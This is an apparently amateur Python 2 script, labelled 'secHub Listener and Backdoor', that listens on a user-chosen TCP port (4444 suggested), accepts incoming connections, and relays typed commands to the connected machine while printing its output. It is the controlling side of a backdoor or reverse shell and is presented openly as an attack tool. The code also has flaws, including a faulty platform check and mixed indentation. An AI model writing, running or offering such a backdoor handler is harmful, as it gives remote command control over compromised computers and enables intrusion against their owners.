import os
import sys
import socket
import time

print """
       ______     ______     ______     __  __     __  __     ______    
       /\  ___\   /\  ___\   /\  ___\   /\ \_\ \   /\ \/\ \   /\  == \   
       \ \___  \  \ \  __\   \ \ \____  \ \  __ \  \ \ \_\ \  \ \  __<   
        \/\_____\  \ \_____\  \ \_____\  \ \_\ \_\  \ \_____\  \ \_____\ 
	 \/_____/   \/_____/   \/_____/   \/_/\/_/   \/_____/   \/_____/ 
	                       Listener and Backdoor
			      	    Version :: 0.1
                            
"""

def PlatformCheck():
	if sys.platform == 'win32':
		print("[!] Windows Detected! secHub is Built For Linux. ")

	if sys.platform == 'win64':
		print("[!] Windows Detected! secHub is Built For Linux. ")

	else:
		print("[+] Linux Detected...\n")

	
def sockListen():
	global host
	global port
	global s
	
	host = ''
	port = input("Enter a Port to listen On(4444 is Best Option): ")
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	try:
		s.bind((host, port))

	except socket.error:
		print("[-] Bind Error: [Error x91] :: Address Already in Use.")
		return False
	
	os.system('clear')
	
	print("[*] Binding Socket To Port: " +str(port))
	s.listen(5)
	time.sleep(3)

	print("[!] Listening For Incoming Intervals")
	time.sleep(3)
	print("[+] Awaiting Connection on LAN")

def sockAccept():
	while True:
		conn, addr = s.accept()
		print("[+] Connection With: " + str(addr[0]) + ":" + str(addr[1]))
		send_commands(conn)
		conn.close()

def send_commands(conn):

	while True:
		command = raw_input("\nShell> ")
		if 'kill' in command:
			break

		if len(str.encode(command)) > 0:
			
 	                conn.send(str.encode(command))

        	        client_responce = str(conn.recv(1024))

                	print(client_responce)

 		else:
			conn.send(command)
			print conn.recv(1024)


		
def main():
	PlatformCheck()
	sockListen()
	sockAccept()

if __name__ == "__main__":
	main()
